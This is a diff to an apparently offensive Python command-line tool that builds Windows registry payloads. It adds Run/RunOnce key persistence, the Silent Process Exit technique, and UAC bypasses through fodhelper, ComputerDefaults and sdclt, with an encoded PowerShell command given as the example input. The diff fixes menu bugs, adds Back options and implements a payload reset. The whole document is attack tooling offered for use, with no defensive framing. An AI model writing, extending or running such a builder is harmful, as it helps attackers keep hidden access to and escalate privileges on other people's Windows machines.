@@ -48,19 +48,22 @@ def set_run():
         print("[2] HKCU, RunOnce")
         print("[3] HKLM, Run (requires admin)")
         print("[4] HKLM, RunOnce (requires admin)")
+        print("[99] Back")
         i = int(input(">> "))
         if i == 1:
             run_hive = "HKEY_CURRENT_USER"
             run_key = "Run"
-        elif i == 1:
+        elif i == 2:
             run_hive = "HKEY_CURRENT_USER"
             run_key = "RunOnce"
-        elif i == 1:
+        elif i == 3:
             run_hive = "HKEY_LOCAL_MACHINE"
             run_key = "Run"
-        elif i == 1:
+        elif i == 4:
             run_hive = "HKEY_LOCAL_MACHINE"
             run_key = "RunOnce"
+        elif i == 99:
+            return
         else:
             print("[-] No such option :(")
             continue
@@ -88,13 +91,13 @@ def add_persistence():
     print("[>] Choose:")
     print("[1] Add persistence using a Run/RunOnce key")
     print("[2] Add persistence using Silent Process Exit technique (requires admin)")
-    print("[3] Back")
+    print("[99] Back")
     i = int(input(">> "))
     if i == 1:
         set_run()
     elif i == 2:
         set_spe()
-    elif i == 3:
+    elif i == 99:
         return
     else:
         print("[-] No such option :(")
@@ -106,11 +109,14 @@ def add_uac_run():
         print("[>] Choose key:")
         print("[1] Run")
         print("[2] RunOnce")
+        print("[99] Back")
         i = int(input(">> "))
         if i == 1:
             run_key = "Run"
         elif i == 2:
             run_key = "RunOnce"
+        elif i == 99:
+            return
         else:
             print("[-] No such option :(")
             continue
@@ -118,6 +124,7 @@ def add_uac_run():
         print("[1] Fodhelper")
         print("[2] ComputerDefaults")
         print("[3] Sdclt")
+        print("[99] Back")
         i = int(input(">> "))
         if i == 1:
             reg_class = "ms-settings"
@@ -128,6 +135,8 @@ def add_uac_run():
         elif i == 3:
             reg_class = "folder"
             uac_binary = "sdclt.exe"
+        elif i == 99:
+            return
         else:
             print("[-] No such option :(")
             continue
@@ -135,17 +144,17 @@ def add_uac_run():
         data_name = input(">> ")
         print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
         command = sanitize_command(input(">> "))
-        payload += template_uac.format(reg_class, uac_binary)
-        payload += template_run.format("HKEY_CURRENT_USER", run_key, data_name, command)
+        payload += template_uac.format(reg_class, command)
+        payload += template_run.format("HKEY_CURRENT_USER", run_key, data_name, uac_binary)
         print("[+] Added")
         return
 
 
-def add_obfuscation():
+def mess_with_registry():
     pass
 
 
-def list_current_payload_actions():
+def add_obfuscation():
     pass
 
 
@@ -154,7 +163,8 @@ def print_payload():
 
 
 def reset_payload():
-    pass
+    global payload
+    payload = payload_prefix
 
 
 def save_payload():
@@ -165,29 +175,29 @@ def main_screen():
     while True:
         print("[>] Choose:")
         print("[1] Add persistence")
-        print("[2] Add UAC bypass + Run key")
-        print("[3] Add obfuscation")
-        print("[4] List current payload actions")
+        print("[2] Add Run key persistence with UAC bypass")
+        print("[3] Mess with registry settings")
+        print("[4] Add obfuscation")
         print("[5] Print payload")
         print("[6] Reset payload")
         print("[7] Save payload")
-        print("[8] Exit")
+        print("[99] Exit")
         i = int(input(">> "))
         if i == 1:
             add_persistence()
         elif i == 2:
             add_uac_run()
         elif i == 3:
-            add_obfuscation()
+            mess_with_registry()
         elif i == 4:
-            list_current_payload_actions()
+            add_obfuscation()
         elif i == 5:
             print_payload()
         elif i == 6:
             reset_payload()
         elif i == 7:
             save_payload()
-        elif i == 8:
+        elif i == 99:
             return
         else:
             print("[-] No such option :(")
